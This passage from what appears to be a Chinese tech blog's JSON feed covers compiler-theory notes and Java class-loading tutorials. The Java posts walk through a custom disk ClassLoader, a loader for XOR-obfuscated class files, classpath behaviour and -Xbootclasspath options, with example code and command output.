","date":"2024-11-11T17:15:43+08:00","permalink":"https://d4n-sec.github.io/p/compilationprinciplecodegeneration/","title":"编译原理-目标代码生成"},{"content":"优化 任务 对前面产生的中间代码进行加工变换，以期在最后阶段能产生更为高效的目标代码。 原则:等价变换 主要关注：公共子表达式的提取、合并已知量、删除无用语句、循环优化等。 循环优化：将循环内的语句优化为必需语句 优化举例 上图左边是C语句，右边为for循环的拆解，根据右边语句生成中间代码\n中间代码如上，优化结果如下\n优化结果中可以看到，乘法消失了\n如果循环中只有示例中的代码的话，可以使用加法一次性计算代替循环计算（+1到100变为+5050，依旧等价）\n","date":"2024-11-11T16:59:47+08:00","permalink":"https://d4n-sec.github.io/p/compilationprincipleoptimize/","title":"编译原理-优化"},{"content":"语义分析和中间代码生成 任务 对语法分析识别出的各类语法范畴，分析其含义，进行和初步翻译，产生介于源代码和目标代码之间的一种代码。 分为两阶段工作： 对每种语法范畴进行静态语义检查 若语义正确，就进行中间代码的翻译 中间代码 中间代码形式有：四元式、三元式、逆波兰式 中间代码生成举例：\nT3为什么是左操作数？\n","date":"2024-11-08T19:41:32+08:00","permalink":"https://d4n-sec.github.io/p/semanticanalysis/","title":"编译原理-语义分析和中间代码生成"},{"content":" 任务 在词法分析的基础上，根据语言的语法规则，把单词符号组成的各类语法单位 语法规则 语言的规则，又称为文法：规定单词如何构成语法单位 语法单位 语法单位包括：短语、子句、语句、过程、程序 语法规则如何表示 BNF（巴科斯范式）：A::=B|C -\u0026gt; 表示A定义为B或C 语法分析的方法 推导（Derive）和归约（Reduce）\n推导\n最左推导、最右推导 最右推导：每次推导都把最右方的字母按照规则转化为标识符或者常量 归约（推导的逆过程）\n最右归约、最左归约 最左归约：每次归约都把最左方的标识符或者常量按照规则转化为字母 两个栗子 语法规则 1 2 3 4 5 6 7 8 9 # 定义 V::=标识符 C::=常数 # 规则 A::=V=E E::=T|E+T T::=F|T*F F::=V|(E)|C 例子一 下图中，箭头方向是最右推导，箭头反方向最左归约 例子二 下图中，箭头方向是最左推导，箭头反方向最右归约 语法分析过程 语法分析过程也可以用一颗倒着的树来表示，这棵树叫语法树，如下\n解析过程思维导图 仅做理解使用\n语法规则 1 2 3 4 5 6 7 8 9 # 定义 V::=标识符 C::=常数 # 规则 A::=V=E E::=T|E+T T::=F|T*F F::=V|(E)|C 赋值语句 例如var a=b*10，可以按照语法规则解析时，思维流程图为：\n语法规则会递归解析，直到变成最开始的定义\n步骤为：\n原式子 处理原式子的规则 处理后的子式子 按照刚才处理的规则，子式子对应的所属 查看所属是否可以对应为定义或者匹配下一个规则 确定结束或者用下一个规则处理 如此循环，直到所有式子处理结束\n语法分析 语法分析的地位：是编译程序的核心部分\n语法分析程序的处理：识别由词法分析得出的单词序列是否是给定文法的句子。\n语法分析的理论基础：上下文无关文法和下推自动机\n语法分析的方式：\n自上而下语法分析反复使用不同产生式进行推导以谋求与输入符号串相匹配 自下而上语法分析对输入符号串寻找不同产生式进行归约直到文法开始符号。 这里所说的输入符号指词法分析所识别的单词。\n下推自动机 下推自动机模型图（PDA）\nPDA和FA的模型相比，多了一个下推栈。 PDA的动作由三个因素来决定：当前状态、读头所指向符号、下推栈栈顶符号。 一个输入串能被PDA所接受，仅当输入串读完，下推栈变空；或输入串读完，控制器到达某些终态 正规文法和有限自动机仅适合于描述和识别高级语言的各类单词，语句可用上下文无关文法来描述，而下推自动机又恰好能识别上下文无关文法所能描述的语言，因此上下文无关文法及其对应的下推自动机就成为编译技术中语法分析的理论基础。 自上而下分析法 定义：从文法的开始符号开始，反复使用不同产生式进行推导以谋求与输入符号串相匹配。\n此处的输入符号串是指词法分析结果的一串二元式\n一般方法：\n试探法：带回溯的自上而下分析法。\n缺陷：\n如果文法存在左递归，语法分析会无限循环下去。（分为直接和间接左递归，可以消除左递归）\n若产生式存在多个候选式，选择哪个进行推导完全是盲目的。（预测与提左因子）\n回溯会引起时间和空间的大量消耗。（可以消除回溯，非盲目选择即可消除回溯）\n如果被识别的语句是错的，算法无法指出错误的确 切位置。\n带预测分析的PDA 在PDA中加入预测分析之后，可以消除自上而下分析中出现回溯的现象。此时PDA可以改造为：\n改造后，整个分析过程都在预测分析程序控制下工作。 预测分析程序用了一个预测分析表，它是预测分析程序分析时的主要依据。 预测分析表是一矩阵M[A,a]，其中行标A是非终结符，列标a是终结符或串结束符;矩阵元素M[A,a]是存放A的一个候选式，指出当前栈顶符号为A且面临读入符号为a时应选的候选式；或者存放“出错标志”，指出A不该面临读入符号a。\n","date":"2024-11-08T17:13:30+08:00","permalink":"https://d4n-sec.github.io/p/grammaranalysis/","title":"编译原理-语法分析"},{"content":"关于 任务\n输入源程序，对构成源程序的字符串进行扫描和分解，识别出一个个的单词 词法分析依照词法规则，识别出正确的单词，转换为统一规格，备用 单词\n高级语言中有实在意义的最小语法单位，字符组成（关键字？） 包括： 基本字：void int float等 标识符：变量名，函数名等 整常数：例如 a*50 中的50 运算符：+ - * / =等 界限符：{} '' ; ()等 转换\n对基本字、运算符、界限符的转换 标识符的转换 常数的转换 转换完成后的格式：（类号，内码） 描述词法规则的有效工具是正规式和有限自动机\n词法分析 编译的第一阶段，在单词的级别上分析和翻译源程序。\n理论基础 有限自动机理论 有限自动机理论与正规文法、正规式之间在描述语言方面有一一对应的关系。 正规集 由正规文法产生的语言\n正规集是集合，可有穷也可无穷。可通过正规式来形式化表示。\n正规式 诶，蛙趣，笔者被做掉了，正规文法，正规式，正规集傻傻分不清楚。\u0026ndash;TODO\u0026ndash;\n有限自动机 有限自动机是一种识别装置，它能准确地识别正规集。它为词法分析程序的构造提供了方法和工具。\n有限自动机是具有离散输入输出系统的数学模型，它具有有限数目的内部状态，系统可以根据当前所处的状态和面临的输入字符决定系统的后继行为。其当前状态概括了过去输入处理的信息。\n基本模型\n包含确定的有限状态自动机 DFA 和 不确定的有限状态自动机 NFA\n考试考点如下，笔者用不着，不学\nNFA确定化 有限状态自动机的简化\n有限状态自动机可以和正规式互相转化，正向是简化，反向是分裂\n词法分析程序 扫描源程序字符串，按照词法规则识别出一个个正确的单词，并转换为相应的二元式形式（类号，内码），交给语法分析使用。\n预处理 源程序中包含注解部分，还有无用的空格、跳格、回车换行等编辑字符，它们与词法分析无关。 一行语句结束应配上一个特殊字符说明。 有些语言要识别标号区，区分标号语句，找出续行符连接成完整语句等。 输出源程序清单以便复核。 预处理程序任务： 从输入缓冲区中读取源程序，预处理后送入扫描缓冲区。此时，扫描缓冲区中的字符都是有效字符。 词法分析程序这时可以再对扫描缓冲区进行扫描 超前搜索 一般高级语言不必超前搜索\n但有些对关键字不加保护的语言，单词间没有明确界符，要在上下文环境中识别单词，这时需要超前搜索。\n词法分析程序输出格式 二元式（类号，内码）：每个单词对应一个二元式。其中类号用整数表示，类号既可区分单词种类，又可便于程序处理。\n类号用于区分单词的种类，考虑的原则是：\n每个基本字占有一个类号，内码缺省； 各种标识符统一为一类，由内码来区分不同的标识符名。通常将各标识符的符号表入口地址作为其内码。 对于常量，以常量的数据类型区分不同类号，对每类设置相应常量表。各常量在其常量表中的入口地址作为其内码。 对于界符，通常一个符号一个类号，内码缺省， 单词分类 以C语言为例\n基本字（关键字、保留字）\n标识符：变量名、数组名、函数名、过程名\n常量\n运算符\n边界符（界符）：. , ; ( ) : {}等，有时把运算符当做边界符\n词法分析程序设计方法 写出该语言的词法规则。 把词法规则转换为相应的状态转换图， 把各转换图的初态连在一起，构成识别该语言的自动机 设计扫描器 把扫描器作为语法分析的一个过程，当语法分析需要一个单词时，就调用扫描器。 扫描器从初态出发，当识别一个单词便进入终态，送出二元式。 可以用状态矩阵代替状态图，以便于计算机处理。\n词法分析程序=状态转换图+控制程序\n控制程序简单，关键是构造状态转换矩阵及其相应的语义动作。可根据单词的正规式及其相应的语义动作自动产生词法分析程序\n","date":"2024-11-08T17:06:57+08:00","permalink":"https://d4n-sec.github.io/p/lexicalanalysis/","title":"编译原理-词法分析"},{"content":"编译程序的工作 词法分析 语法分析 语义分析和中间代码生成 优化 目标代码生成 上图中的语义分析一般来说会被融合进语法分析中\n","date":"2024-11-08T17:02:31+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241108170335764.png","permalink":"https://d4n-sec.github.io/p/compilationprinciple/","title":"编译原理"},{"content":"自定义类加载器的使用 根据前文，不管是Bootstrap ClassLoader还是ExtClassLoader等，这些类加载器都只是加载指定的目录下的jar包或者资源。如果在某种情况下，我们需要动态加载一些东西呢？\n比如从D盘某个文件夹加载一个class文件，这个路径是输入的而非程序运行时配置参数。\n或者从网络上下载class主内容然后再进行加载，这样可以吗？\n包的，通过自定义类加载器完全可以实现。\n我们使用两个栗子来感受自定义类加载器的使用场景。\n本地动态指定加载类路径 如何自定义 编写一个类，笔者设置为DiskClassLoader，继承 ClassLoader（抽象类） 重写ClassLoader.findClass() -\u0026gt; DiskClassLoader.findClass() 在重写的DiskClassLoader.findClass()中调用ClassLoader.defineClass()用以加载类 ClassLoader.defineClass()，此方法在编写自定义classLoader的时候很重要，他的作用是将class字节码信息转化为Class对象\n注：一个ClassLoader创建时如果没有指定parent，那么它的parent默认为AppClassLoaders\n！！！注意代码中的注释喔！！！\n测试用例 Test.java -\u0026gt; D:\\Users\\Dan\\tmp\\Test.java\n1 2 3 4 5 6 7 package com.frank.test; public class Test { public void say(){ System.out.println(\u0026#34;Say Hello\u0026#34;); } } 使用java编译\n1 D:\\Users\\Dan\\tmp\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\javac.exe\u0026#34; -d . D:\\Users\\Dan\\tmp\\Test.java 此时D:\\Users\\Dan\\tmp\\内容如下\n1 2 3 4 5 6 ./ ├── Test.java └── com └── frank └── test └── Test.class 编写ClassLoader DiskClassLoader 源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package com.study.java; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; public class DiskClassLoader extends ClassLoader { private String mLibPath; public DiskClassLoader(String path) { // TODO Auto-generated constructor stub mLibPath = path; } @Override protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { // TODO Auto-generated method stub // 此时因为路径人为控制，包名已知等条件，这里直接硬编码了 mLibPath = mLibPath + \u0026#34;\\\\com\\\\frank\\\\test\u0026#34;; String fileName = \u0026#34;Test.class\u0026#34;; File file = new File(mLibPath,fileName); try { FileInputStream is = new FileInputStream(file); ByteArrayOutputStream bos = new ByteArrayOutputStream(); int len = 0; try { while ((len = is.read()) != -1) { bos.write(len); } } catch (IOException e) { e.printStackTrace(); } byte[] data = bos.toByteArray(); is.close(); bos.close(); return defineClass(name,data,0,data.length); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } return super.findClass(name); } } 编写测试开启类 ClassLoaderTest\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package com.study.java; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ClassLoaderTest { public static void main(String[] args) { // TODO Auto-generated method stub //创建自定义classloader对象。 DiskClassLoader diskLoader = new DiskClassLoader(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\u0026#34;); try { //加载class文件 Class c = diskLoader.loadClass(\u0026#34;com.frank.test.Test\u0026#34;); if(c != null){ try { Object obj = c.newInstance(); Method method = c.getDeclaredMethod(\u0026#34;say\u0026#34;,null); //通过反射调用Test类的say方法 method.invoke(obj, null); } catch (InstantiationException | IllegalAccessException | NoSuchMethodException | SecurityException | IllegalArgumentException | InvocationTargetException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } 运行测试开启类 成功反射到目标say()并运行\nClassLoader加载加密类 （假设）我们的Class字节码文件很值钱，但是容易被传播，我们又想要实现必须要给了钱的人才能解密的方案，这个时候就可以对我们的字节码文件进行加密\n测试用例 延续使用上方的测试用例\n工具类 用来加密测试用例生成的字节码文件\nFileUtils，源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package com.study.encode; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; public class FileUtils { public static void test(String path){ File file = new File(path); try { FileInputStream fis = new FileInputStream(file); FileOutputStream fos = new FileOutputStream(path+\u0026#34;en\u0026#34;); int b = 0; int b1 = 0; try { while((b = fis.read()) != -1){ //每个byte都加密 加密密钥为数字2 //处理：每一个byte异或数字2 fos.write(b ^ 2); } fos.close(); fis.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } 测试一下\n1 2 3 public static void main(String[] args) { FileUtils.test(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\\\\com\\\\frank\\\\test\\\\Test.class\u0026#34;); } 这时候目录结构中多出了一个被加密后的字节码文件你Test.classen，删除原来的Test.class就得到了\n1 2 3 4 5 6 ./ ├── Test.java └── com └── frank └── test └── Test.classen 可解密的ClassLoader DeClassLoader源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package com.study.encode; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.IOException; public class DeClassLoader extends ClassLoader { private String mLibPath; public DeClassLoader(String path) { // TODO Auto-generated constructor stub mLibPath = path; } @Override protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { // TODO Auto-generated method stub String fileName = getFileName(name); File file = new File(mLibPath,fileName); try { FileInputStream is = new FileInputStream(file); ByteArrayOutputStream bos = new ByteArrayOutputStream(); int len = 0; byte b = 0; try { while ((len = is.read()) != -1) { //！！！！！！！ //解密过程在这里 //将数据异或一个数字2以进行解密 b = (byte) (len ^ 2); bos.write(b); } } catch (IOException e) { e.printStackTrace(); } byte[] data = bos.toByteArray(); is.close(); bos.close(); return defineClass(name,data,0,data.length); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } return super.findClass(name); } //获取要加载 的class文件名 private String getFileName(String name) { // TODO Auto-generated method stub int index = name.lastIndexOf(\u0026#39;.\u0026#39;); if(index == -1){ return name+\u0026#34;.classen\u0026#34;; }else{ return name.substring(index+1)+\u0026#34;.classen\u0026#34;; } } } 测试开启类 Main源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package com.study.encode; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Main { public static void main(String[] args) { DeClassLoader diskLoader = new DeClassLoader(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\\\\com\\\\frank\\\\test\u0026#34;); try { //加载class文件 Class c = diskLoader.loadClass(\u0026#34;com.frank.test.Test\u0026#34;); if(c != null){ try { Object obj = c.newInstance(); Method method = c.getDeclaredMethod(\u0026#34;say\u0026#34;,null); //通过反射调用Test类的say方法 try { method.invoke(obj, null); } catch (InvocationTargetException e) { throw new RuntimeException(e); } } catch (InstantiationException | IllegalAccessException | NoSuchMethodException | SecurityException | IllegalArgumentException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } // public static void main(String[] args) { // FileUtils.test(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\\\\com\\\\frank\\\\test\\\\Test.class\u0026#34;); // } } 运行结果 将DeClassLoader中的b = (byte) (len ^ 2);注释掉，就可以删除解密过程，其他不动的情况下，解密自然失败了，失败截图如下\n参考 https://blog.csdn.net/briblue/article/details/54973413\n","date":"2024-11-08T11:10:34+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241107144702889.png","permalink":"https://d4n-sec.github.io/p/userdefineclassloader/","title":"Java自定义类加载器"},{"content":"ClassPath是Java中一个重要的环境变量，弄懂他对于Java运行环境的理解有重大的帮助\nClassPath是什么 CLASSPATH直译过来是类路径，是Java环境配置中要设置的一个环境变量，就是.class文件的路径，表示JVM从哪里去寻找要运行的class文件，CLASSPATH = D:\\java表示执行java命令时去D:\\java目录中去找需要被执行的class文件并运行。\n体验package 先来体验一个正常的Java项目，目录结构如下\n1 2 3 4 5 6 7 ./ └── com └── study ├── java │ ├── MainTest.java └── school └── Student.java Student.java内容如下\n1 2 3 4 5 6 7 package com.study.school; public class Student { public void study() { System.out.println(\u0026#34;I\u0026#39;m studying...\u0026#34;); } } MainTest.java内容如下\n1 2 3 4 5 6 7 8 9 package com.study.java; import com.study.school.Student; public class MainTest { public static void main(String[] args) { Student s = new Student(); s.study(); } } 运行MainTest.java中的main()，可以得到\n正常调用\n可以看到，两个Java类处于不同的目录，也能正常调用，前提是MainTest.java识别到了Student.java的包路径，准确import了com.study.school.Student，这个包路径是package定义的！\n体验ClassPath 首先我们整个目录结构如下\n1 2 ./ ├── MainTest.java 我们先关注MainTest.java，看看他的内容\n1 2 3 4 5 public class MainTest { public static void main(String[] args){ System.out.println(\u0026#34;hello-hi\u0026#34;); } } 很简单，只是一句输出，那么我们先执行javac命令，将他编译为字节码文件，再使用java命令去执行他\n1 2 3 4 5 6 7 8 9 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\javac.exe\u0026#34; MainTest.java # 此时产生了 MainTest.class 在 MainTest.java 同级路径下，如下， # ./ # ├── MainTest.class # 默认和.java文件同路径 # ├── MainTest.java # 源.java文件 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\java.exe\u0026#34; MainTest hello-hi # 符合预期 目前为止所有的输出都符合预期。\n但同时我们也理解，一个大型的，或者可拓展性强的Java项目，是按照模块化思维来进行开发的，所以不同的功能会交给不同的包来执行，Java提供了package关键字来做到这点。正如上面的案例一样\n为了模拟项目环境，我们需要修改目录结构以及.java的内容\n1 2 3 4 5 ./ ├── MainTest.java ├── bin └── src └── MainTestClassPath.java 那我们稍微修改一下MainTest.java，让他处于包环境内，变成MainTestClassPath.java，只添加了package关键字以及包路径\nMainTestClassPath.java内容如下\n1 2 3 4 5 6 7 package com.study.java; public class MainTestClassPath { public static void main(String[] args){ System.out.println(\u0026#34;hello-hi\u0026#34;); } } 此时我们再执行javac命令，将他编译为字节码文件，再使用java命令去执行他\n1 2 3 4 5 6 7 8 9 10 11 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;javac.exe .\\src\\MainTestClassPath.java # 此时产生了 MainTestClassPath.class 在 MainTestClassPatht.java 同级路径下，如下是当前的目录结构， # ./ # ├── MainTest.java # ├── bin # └── src # ├── MainTestClassPath.class # └── MainTestClassPath.java C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;java.exe .\\src\\MainTestClassPath 错误: 找不到或无法加载主类 C:\\Users\\Dan\\Desktop\\pppppp\\src\\MainTestClassPath 报错了，为什么？原因很清楚的告知了我们，没有找到或者无法加载主类，但是我们运行的类很简单，不应该出现类层面的问题，唯一出现的问题，就是添加了package关键字。\n没有找到类，是因为ClassLoader查找失败了\n这些问题是怎么形成的，暂时按下不表，至于如何修复，或者说如何正确调用呢？\n解决 步骤应该如下\n目录结构没有变化\n1 2 3 4 ./ ├── bin └── src └── MainTestClassPath.java MainTestClassPath.java内容也不变\n1 2 3 4 5 6 7 package com.study.java; public class MainTestClassPath { public static void main(String[] args){ System.out.println(\u0026#34;hello-hi\u0026#34;); } } 执行如下命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;javac.exe .\\src\\MainTestClassPath.java -d bin # 执行完此命令后，目录结构如下 # ./ # ├── MainTest.java # ├── bin # │ └── com # │ └── study # │ └── java # │ └── MainTestClassPath.class # └── src # └── MainTestClassPath.java C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;java.exe -classpath bin com.study.java.MainTestClassPath # 成功 hello-hi # 也可以 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;cd bin C:\\Users\\Dan\\Desktop\\pppppp\\bin\u0026gt;java.exe com.study.java.MainTestClassPath #成功 hello-hi 成功执行了，为什么，不同的点在于使用了 -d 参数，-d指定了生成目录，在bin目录下生成。\n这个时候javac自动创建了多级目录，按照package的.号作为目录划分符，将创建好的MainTestClassPath.class放在了目录最深处\n然后使用java命令，指定classpath为bin目录，执行com.study.java.MainTestClassPath类时，ClassLoader会在bin目录下寻找com.study.java.MainTestClassPath类，并且将.作为目录分隔符，进入目录查找类，此时就找到了\n如果运行java命令时，不指定ClassPath参数，需要先进入bin目录，再执行java.exe com.study.java.MainTestClassPath，这样java除了默认查找路径外（这些默认路径和项目文件无关），也会查找当前目录下有没有com.study.java.MainTestClassPath类，同样将.作为目录分隔符，进入目录查找类，此时也能找到\n可以尝试将MainTestClassPath.class拿出目录时，不管怎么执行都同样会得到错误: 找不到或无法加载主类的情况，所以默认的ClassLoader的查找是和路径强相关的。\nClassPath 所以ClassPath是什么？\nClassPath是一个环境变量，表示JVM从哪里去寻找要运行的class文件，ClassPath会包含默认路径与执行命令的当前目录\n根据javac的生成可以得知，package关键字会将包路径中的.号作为目录分隔符。这样就解释了为什么IDEA中，源码路径也需要保持和package声明保持一致的原因，为了尽量和生成路径一致\nIDEA报错 IDEA正常 总结 在这篇文章中提到的类加载器的加载阶段，应用程序类加载器 - Application Class Loader是会根据ClassPath来加载类（Bootstrap Class Loader 和 Extension Class Loader不会），所以做此补充，并且ClassPath可以做为参数传递给JVM，使其包含除默认目录外的其他目录\n所以如果你到类找不到了，好好配置一下ClassPath吧\nTips 我们强烈不推荐在系统环境变量中设置classpath，那样会污染整个系统环境。在启动JVM时设置classpath才是推荐的做法。实际上就是给java命令传入-classpath参数：\n1 java -classpath .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello 或者使用-cp的简写：\n1 java -cp .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello 参考 https://liaoxuefeng.com/books/java/oop/basic/package/\nhttps://liaoxuefeng.com/books/java/oop/basic/classpath-jar/index.html\n","date":"2024-11-07T16:31:15+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241107144702889.png","permalink":"https://d4n-sec.github.io/p/javaclasspath/","title":"Java ClassPath"},{"content":"前文有提到Java的默认ClassLoader有三种，且三种的ClassLoader会加载不同的Java类。\n他们加载的类的路径在哪？\n是否可以进行设置？\n本文做一个初步探讨\n全量输出 在不配置任何参数的情况下，执行MainTest.java查看默认路径\nMainTest.java内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import java.net.URL; import java.net.URLClassLoader; public class MainTest { public static void main(String[] args) { System.out.println(\u0026#34;BootstrapClassLoader LoadPath: \u0026#34;); URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs(); for(URL url : urls) System.out.println(url); // System.out.println(System.getProperty(\u0026#34;sun.boot.class.path\u0026#34;)); 也可以 System.out.println(\u0026#34;----------------------------\u0026#34;); //取得扩展类加载器 URLClassLoader extClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader().getParent(); System.out.println(extClassLoader); System.out.println(\u0026#34;ExtClassLoader LoadPath: \u0026#34;); urls = extClassLoader.getURLs(); for(URL url : urls) System.out.println(url); // System.out.println(System.getProperty(\u0026#34;java.ext.dirs\u0026#34;)); 也可以 System.out.println(\u0026#34;----------------------------\u0026#34;); //取得应用(系统)类加载器 URLClassLoader appClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader(); System.out.println(appClassLoader); System.out.println(\u0026#34;AppClassLoader LoadPath: \u0026#34;); urls = appClassLoader.getURLs(); for(URL url : urls) System.out.println(url); // System.out.println(System.getProperty(\u0026#34;java.class.path\u0026#34;)); 也可以 System.out.println(\u0026#34;----------------------------\u0026#34;); } } 使用最原始的方法运行，结果如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 cmd\u0026gt;javac.exe .\\MainTest.java # 有一个warning，删除了，不重要，jdk version 如下 # java version \u0026#34;1.8.0_181\u0026#34; # Java(TM) SE Runtime Environment (build 1.8.0_181-b13) # Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode) # 此时的目录结构 # ./ # ├── MainTest.class # └── MainTest.java cmd\u0026gt;java.exe MainTest # 全量输出如下 BootstrapClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes ---------------------------- sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/access-bridge-64.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/cldrdata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/dnsns.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jaccess.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jfxrt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/localedata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/nashorn.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunec.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunjce_provider.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunmscapi.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunpkcs11.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/zipfs.jar ---------------------------- sun.misc.Launcher$AppClassLoader@73d16e93 AppClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/ ---------------------------- Class Loader Bootstrap Class Loader：加载sun.boot.class.path所指定的路径或jar 默认情况下，可以看到加载的类集中在jre\\lib目录和jre\\classes目录下。\nExtension Class Loader：加载java.ext.dirs所指定的路径或jar。 默认情况下，可以看到加载的类集中在jre\\lib\\ext目录下。\nApplication Class Loader加载java.class.path并会搜索应用程序的类路径（包括用户定义的类路径和系统类路径） 默认情况下，最简单的情况，可以看到加载的类只有java命令的执行目录。也就是ClassPath的默认路径，相关知识链接\n进阶一点 可以看到三个类加载的默认路径还是挺单一的，所以如果我们想要增加类加载器的加载路径，应该如何做呢？\nbootclasspath：对应 Bootstrap CLassLoader。java虚拟机系统参数sun.boot.class.path。 Extensions JAR files：对应 Extention ClassLoader 。java虚拟机系统参数java.ext.dirs。 classpath：对应 AppClassLoader。java虚拟机系统参数java.class.path。\nBootstrap Class Loader 如果要修改或者增加Bootstrap Class Loader的加载路径，三个参数\n-Xbootclasspath: 完全取代基本核心的Java class 搜索路径.不常用（慎用）,否则要重新写所有Java核心类 -Xbootclasspath/a: 后缀。在bootclasspath后面添加。常用！！ -Xbootclasspath/p: 前缀。在bootclasspath前面添加。不常用，避免引起不必要的冲突。 -Xbootclasspath/a 示例 省略无关部分，结果如下\n1 2 3 4 5 6 7 8 9 10 11 cmd\u0026gt;java.exe -Xbootclasspath/a:.\\lib\\ MainTest BootstrapClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes file:/C:/Users/Dan/Desktop/ppppppp/lib 可以看到最后一行添加了当前路径下的lib文件夹\n-Xbootclasspath/p 示例 省略无关部分，结果如下\n1 2 3 4 5 6 7 8 9 10 11 cmd\u0026gt;java.exe -Xbootclasspath/p:.\\lib\\ MainTest BootstrapClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/lib file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar 